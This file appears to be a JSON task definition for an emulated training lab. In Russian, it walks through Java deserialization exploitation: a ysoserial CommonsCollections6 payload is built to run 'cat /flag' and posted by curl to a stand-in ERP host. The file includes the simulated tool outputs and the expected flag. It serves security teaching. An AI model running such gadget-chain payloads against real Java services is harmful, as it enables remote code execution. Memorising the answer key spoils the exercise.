@@ -1,0 +1,30 @@
+{
+  "id": "web-java-deser-chains",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ys0s3r14l_g4dg3t_ch41n_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Java gadget chain (ysoserial)\n\nПриложение `http://erp.example` кладёт сессию в cookie `session` как base64\nJava-объекта (`session.txt`). Сервер вызывает readObject() на нашем значении.\n\n1. Подтверди формат (ждём магические байты `aced 0005`):\n\n   base64 -d session.txt | xxd | head -1\n\n2. Собери payload цепочкой CommonsCollections6 и сохрани в файл:\n\n   java -jar ysoserial.jar CommonsCollections6 'cat /flag' -o payload.ser\n\n3. Отправь сериализованный объект серверу:\n\n   curl -s http://erp.example/ --data-binary @payload.ser > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/session.txt", "text": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZXhyABBqYXZhLnV0aWwuQWJzdHJhY3RRdWV1ZQ==\n" }
+  ],
+  "tools": {
+    "java": {
+      "help": "java -jar ysoserial.jar <цепочка> '<команда>' [-o файл] — генератор Java-payload'ов",
+      "cases": [
+        { "match": "CommonsCollections6.*flag|ysoserial.*flag", "example": "-jar ysoserial.jar CommonsCollections6 'cat /flag' -o payload.ser", "output": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZXhyABBqYXZhLnV0aWwuQWJzdHJhY3RRdWV1ZQR4cQB+AAN3BAAAAARzcgA8b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeQAAAAAAAAABAwAAeHB0AARjYXQgdAAFL2ZsYWc=\n", "writes": ["-o"] },
+        { "match": "CommonsCollections6|CommonsCollections|ysoserial", "example": "-jar ysoserial.jar CommonsCollections6 'id'", "output": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZXhyABBqYXZhLnV0aWwuQWJzdHJhY3RRdWV1ZQR4cQB+AAN3BAAAAARzcgA8b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeQAAAAAAAAABAwAAeHB0AAJpZA==\n" },
+        { "match": "--list|-l", "example": "--list", "output": "CommonsCollections1..7, CommonsBeanutils1, Groovy1, Spring1, JRMPClient, ...\n" }
+      ],
+      "fallback": "java: в этой лабе эмулируется только ysoserial (java -jar ysoserial.jar <цепочка> '<cmd>').\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция erp.example)",
+      "cases": [
+        { "match": "@payload|payload\\.ser|--data-binary", "example": "-s http://erp.example/ --data-binary @payload.ser", "output": "{\"status\":\"error\",\"message\":\"Exception in thread \\\"main\\\" java.io.IOException: Cannot run program \\\"cat\\\": nto{ys0s3r14l_g4dg3t_ch41n_rce}\"}\n" },
+        { "match": "erp\\.example", "example": "-s http://erp.example/", "output": "{\"status\":\"ok\",\"user\":\"bob\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://erp.example/.\n"
+    }
+  }
+}
